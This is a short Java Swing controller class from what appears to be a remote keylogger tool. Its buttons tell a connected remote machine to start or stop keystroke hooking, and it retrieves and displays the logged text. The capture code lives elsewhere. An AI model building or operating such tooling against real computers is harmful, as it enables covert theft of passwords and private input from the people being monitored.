package controller;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;

import javax.swing.*;

import model.Client;

import view.features.*;

public class KeylogListener implements ActionListener{
	
	private KeylogDesign keylogDesign;
	
	public KeylogListener(KeylogDesign keylogDesign)
	{
		this.keylogDesign = keylogDesign;
	}
	
	private void Hook() {
		try {
			Client.out.write("HOOK");
			Client.out.newLine();
			Client.out.flush();
		} catch (IOException e2) {
			e2.printStackTrace();
		}			
		//JOptionPane.showMessageDialog(null, "Start Hook");	
	}
	
	private void Unhook() {
		try {
			Client.out.write("UNHOOK");
			Client.out.newLine();
			Client.out.flush();
		} catch (IOException e2) {
			e2.printStackTrace();
		}
	}
	
	private void ShowText() {
		String keylogString = null;

		try {
			Client.out.write("SHOW TEXT");
			Client.out.newLine();
			Client.out.flush();
		} catch (IOException e2) {
			e2.printStackTrace();
		}
		
		try {
			keylogString = Client.in.readLine();
		} catch (IOException e1) {
			e1.printStackTrace();
		}
	    this.keylogDesign.txtKeylog.append(keylogString); 

	}
	
	private void ClearText() {
		this.keylogDesign.txtKeylog.setText("");		
	}
	
	@Override
	public void actionPerformed(ActionEvent e) {
		if(Client.client == null) {
			JOptionPane.showMessageDialog(null, "Not connected to the server");
			return;
		}
		
		String click = e.getActionCommand();
		
		if (click.equals("HOOK")) this.Hook();
		
		if (click.equals("UNHOOK")) this.Unhook();
		
		if (click.equals("SHOW TEXT")) this.ShowText();

		if (click.equals("CLEAR TEXT")) this.ClearText();
		
	}
	
	
}
